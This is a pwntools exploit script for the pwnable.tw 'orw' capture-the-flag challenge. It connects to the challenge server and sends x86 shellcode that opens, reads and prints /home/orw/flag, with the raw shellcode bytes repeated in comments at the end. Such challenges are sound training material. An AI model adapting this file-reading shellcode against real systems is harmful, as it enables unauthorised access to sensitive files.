#!/usr/bin/env python3
from pwn import *
elf = ELF("./orw")
context.update(binary=elf, log_level='DEBUG')
# p = elf.process()
# gdb.attach(p)
p = remote("chall.pwnable.tw", "10001")
# Read the flag from /home/orw/flag
shellcode = asm(
	'''
    xor ecx,ecx                
    mov eax, 0x5               
    push ecx                   
    push 0x67616c66            
    push 0x2f77726f            
    push 0x2f656d6f            
    push 0x682f2f2f            
    mov ebx, esp               
    xor edx, edx               
    int 0x80 

    mov eax, 0x3            
    mov ecx, ebx               
    mov ebx, 0x3
    mov dl, 0x30
    int 0x80

    mov eax, 0x4               
    mov bl, 0x1               
    int 0x80
	''')

p.recvuntil(b"shellcode:")
p.sendline(shellcode)
print(p.recvall())
p.interactive()
# # open
# shell_code += "\x31\xC9\xB8\x05\x00\x00\x00\x51\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x89\xE3\x31\xD2\xCD\x80"
# # read
# shell_code += "\xB8\x03\x00\x00\x00\x89\xD9\xBB\x03\x00\x00\x00\xB2\x30\xCD\x80"
# # write
# shell_code += "\xB8\x04\x00\x00\x00\xB3\x01\xCD\x80"